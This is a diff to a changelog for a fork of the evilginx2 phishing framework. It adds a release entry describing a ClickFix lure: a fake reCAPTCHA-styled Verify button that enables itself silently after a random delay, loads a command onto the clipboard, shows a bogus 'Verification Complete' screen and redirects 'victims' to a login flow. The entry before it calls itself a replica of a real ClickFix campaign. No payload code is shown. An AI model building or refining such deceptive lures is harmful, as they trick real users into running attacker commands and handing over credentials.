@@ -4,6 +4,17 @@ Forked from [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (upstrea
 commit `4c0988a`). Every extension is clean-room (no reference to commercial
 binaries) and verified end-to-end on the two-node lab (Kali + Ubuntu).
 
+## v0.11.5 (2026-09-22) — windows-fix Verify button
+
+- **windows-fix**: stage 2 gained a full-width Verify button (Google blue,
+  matches the reCAPTCHA theme). It starts dimmed/disabled and silently
+  enables after a **random 5–15 s** delay (no countdown text, same pattern
+  as cloudflare-turnstile). Clicking it re-arms the clipboard, swaps the
+  panel to a green "Verification Complete" state, then redirects to the
+  login flow after ~1.2–1.7 s. The silent 30–60 s auto-redirect remains as
+  a fallback for victims who never click.
+- Docs updated (clickfix guide flow + phishlet-authoring).
+
 ## v0.11.4 (2026-09-21) — ClickFix real-campaign replica + unified clipboard tail
 
 - **Unified Win+R tail** (all templates, incl. future ones): the wrapped
